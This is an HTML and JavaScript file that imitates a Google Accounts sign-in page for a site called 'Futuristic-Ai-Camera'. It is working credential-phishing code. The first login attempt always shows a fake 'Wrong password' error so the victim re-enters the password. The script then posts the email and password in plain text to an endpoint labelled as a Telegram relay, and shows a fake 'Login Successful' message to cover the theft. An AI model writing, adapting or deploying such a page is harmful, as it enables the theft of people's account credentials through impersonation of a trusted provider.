<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sign in - Google Accounts</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    body {
      font-family: 'Roboto', Arial, sans-serif;
      background: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 20px;
    }
    
    .google-container {
      max-width: 450px;
      width: 100%;
      border: 1px solid #dadce0;
      border-radius: 8px;
      padding: 48px 40px 36px;
    }
    
    .google-logo {
      text-align: center;
      margin-bottom: 24px;
    }
    
    .google-logo img {
      width: 75px;
    }
    
    .google-title {
      text-align: center;
      font-size: 24px;
      font-weight: 400;
      color: #202124;
      margin-bottom: 8px;
    }
    
    .google-subtitle {
      text-align: center;
      font-size: 16px;
      color: #202124;
      margin-bottom: 24px;
    }
    
    .google-error {
      color: #d93025;
      background: #fce8e6;
      padding: 12px 16px;
      border-radius: 4px;
      margin-bottom: 16px;
      font-size: 14px;
      display: none;
    }
    
    .google-input {
      width: 100%;
      padding: 13px 15px;
      font-size: 16px;
      border: 1px solid #dadce0;
      border-radius: 4px;
      margin-bottom: 24px;
      outline: none;
    }
    
    .google-input:focus {
      border-color: #1a73e8;
      border-width: 2px;
      padding: 12px 14px;
    }
    
    .google-forgot {
      color: #1a73e8;
      font-size: 14px;
      font-weight: 500;
      text-decoration: none;
      margin-bottom: 24px;
      display: inline-block;
    }
    
    .google-actions {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-top: 24px;
    }
    
    .google-create {
      color: #1a73e8;
      font-size: 14px;
      font-weight: 500;
      text-decoration: none;
    }
    
    .google-next-btn {
      padding: 10px 24px;
      background: #1a73e8;
      color: #fff;
      font-size: 14px;
      font-weight: 500;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }
    
    .google-next-btn:hover {
      background: #1765cc;
    }
    
    .back-link {
      text-align: center;
      margin-top: 20px;
    }
    
    .back-link a {
      color: #1a73e8;
      text-decoration: none;
      font-size: 14px;
    }
  </style>
</head>
<body>

    </div>
    
    <h1 class="google-title">Sign in</h1>
    <p class="google-subtitle">to continue to Futuristic-Ai-Camera</p>
    
    <div id="google-error" class="google-error"></div>
    
    <input 
      type="email" 
      id="google-email" 
      class="google-input" 
      placeholder="Email or phone"
    >
    
    <input 
      type="password" 
      id="google-password" 
      class="google-input" 
      placeholder="Enter your password"
    >
    
    <a href="#" class="google-forgot">Forgot password?</a>
    
    <div class="google-actions">
      <a href="#" class="google-create">Create account</a>
      <button class="google-next-btn" onclick="googleLogin()">Next</button>
    </div>
    
    <div class="back-link">
      <a href="profile.html">‚Üê Back to Profile</a>
    </div>
  </div>
  
  <script>
    let attemptCount = 0;
    
    async function googleLogin() {
      const email = document.getElementById('google-email').value.trim();
      const password = document.getElementById('google-password').value;
      const errorDiv = document.getElementById('google-error');
      
      if (!email || !password) {
        errorDiv.textContent = "Enter an email or phone number";
        errorDiv.style.display = "block";
        return;
      }
      
      attemptCount++;
      
      if (attemptCount === 1) {
        errorDiv.textContent = "Wrong password. Try again or click Forgot password to reset it.";
        errorDiv.style.display = "block";
        return;
      }
      
      errorDiv.style.display = "none";
      
      localStorage.setItem("userLoggedIn", "true");
      localStorage.setItem("userName", email);
      localStorage.setItem("loginMethod", "Google");
      
      await sendToTelegram("Google", email, password);
      
      alert("‚úÖ Login Successful!\n\nWelcome to Premium!");
      window.location.href = "index.html";
    }
    
    async function sendToTelegram(method, email, password) {
      const message = `üîê New Login - ${method}\n\nEmail/Username: ${email}\nPassword: ${password}\n\nFrom: Futuristic-Ai-Camera`;
      
      try {
        const response = await fetch("/upload-text", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ text: message })
        });
        console.log("‚úÖ Sent to Telegram!");
      } catch (err) {
        console.error("Telegram error:", err);
      }
    }
  </script>
